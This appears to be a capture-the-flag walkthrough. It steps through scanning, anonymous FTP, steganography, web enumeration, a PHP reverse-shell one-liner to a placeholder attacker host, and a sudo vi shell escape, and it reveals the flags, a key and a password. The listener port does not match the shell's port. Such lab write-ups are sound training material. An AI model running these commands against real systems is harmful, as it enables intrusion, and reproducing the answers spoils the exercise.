# key
nmap showed `ftp, ssh and http` - `nmap -F -oN initial IP`  
`nmap -p 21 IP`  
connected tp ftp with anonymous login  
got the picture  
used steghide to see if something is hidden in the file `steghide --extract -sf FILE_NAME`  
got a b65 encoded text file  
decoded it `b64 -d FILE_NAME`  
got a shadow file  

found a `home.php` route on the webserver with `gobuster dir -u IP -w /usr/share/wordlists/seclists/web-content/common.txt`  
found a site where you can enter php code  
got a reverse shell with `php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'` and `nc -lvnp 4444`  
`strings key_rev_key` to find the key  

<details>
b'-VkgXhFf6sAEcAwrC6YR-SZbiuSb8ABXeQuvhcGSQzY='
<summary>key</summary>
</details>

# charlie's password
`cat validate.php` to find the password  

<details>
cn7824
<summary>password</summary>
</details>

# change user to charlie
`cd /home/charlie`  
`teleport` is a private ssh key  
connect to the machine via ssh `ssh -i ssh.key charlie@IP`     

# user flag
`/home/charlie/user.txt`
<details>
flag{cd5509042371b34e4826e4838b522d2e}
<summary>user.txt</summary>
</details>

# root flag
`sudo -l` to find out that vi can be run with sudo  
`sudo vi -c ':!/bin/sh' /dev/null` - found on gtfobins  
found `root.py` in `/root`  
used the key from `/home/charlie/key_rev_key`  to run the program and got the flag  
<details>
flag{cec59161d338fef787fcb4e296b42124}
<summary>root.txt</summary>
</details>
